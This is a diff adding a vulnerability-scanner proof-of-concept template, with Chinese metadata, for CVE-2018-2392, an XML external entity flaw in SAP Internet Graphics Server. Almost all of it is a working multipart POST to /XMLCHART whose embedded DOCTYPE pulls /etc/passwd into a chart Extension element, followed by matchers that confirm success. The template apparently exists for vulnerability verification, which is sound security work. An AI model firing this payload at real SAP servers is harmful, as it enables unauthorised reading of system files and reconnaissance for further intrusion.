@@ -1,0 +1,100 @@
+[info]
+author = "AVE"
+description = "通过向SAP IGS的/XMLCHART端点发送特制multipart请求，利用Extension HTML标签的XXE漏洞读取系统文件/etc/passwd，验证漏洞存在"
+id = "POC-AVE-2018-0170"
+name = "SAP Internet Graphics Server XML外部实体注入漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2018-2392",
+    "sap",
+    "igs",
+    "xxe",
+    "xmlchart",
+]
+vuln_id = [
+    "CVE-2018-2392",
+    "AVE-2018-0170",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/XMLCHART"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+--{{randstr_1}}\r
+Content-Disposition: form-data; name="{{randstr_2}}"; filename="{{randstr_3}}.xml"\r
+Content-Type: application/xml\r
+\r
+<?xml version='1.0' encoding='UTF-8'?>\r
+    <ChartData>\r
+      <Categories>\r
+        <Category>ALttP</Category>\r
+      </Categories>\r
+      <Series label="{{randstr_4}}">\r
+        <Point>\r
+          <Value type="y">12345</Value>\r
+        </Point>\r
+      </Series>\r
+    </ChartData>\r
+--{{randstr_1}}\r
+Content-Disposition: form-data; name="{{randstr_5}}"; filename="{{randstr_6}}.xml"\r
+Content-Type: application/xml\r
+\r
+<?xml version='1.0' encoding='UTF-8'?>\r
+    <!DOCTYPE Extension [<!ENTITY xxe SYSTEM "/etc/passwd">]>\r
+    <SAPChartCustomizing version="1.1">\r
+      <Elements>\r
+        <ChartElements>\r
+          <Title>\r
+            <Extension>&xxe;</Extension>\r
+          </Title>\r
+        </ChartElements>\r
+      </Elements>\r
+    </SAPChartCustomizing>\r
+--{{randstr_1}}--\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary={{randstr_1}}"
+
+[[poc.requests.matchers]]
+condition = "and"
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Picture",
+    "Info",
+    "/output/",
+]
+
+[[poc.requests.matchers]]
+condition = "or"
+expect = true
+part = "body"
+type = "word"
+words = [
+    "ImageMap",
+    "Errors",
+]
+
+[[poc.requests.matchers]]
+condition = "and"
+expect = true
+part = "header"
+type = "word"
+words = [
+    "text/html",
+    "SAP Internet Graphics Server",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
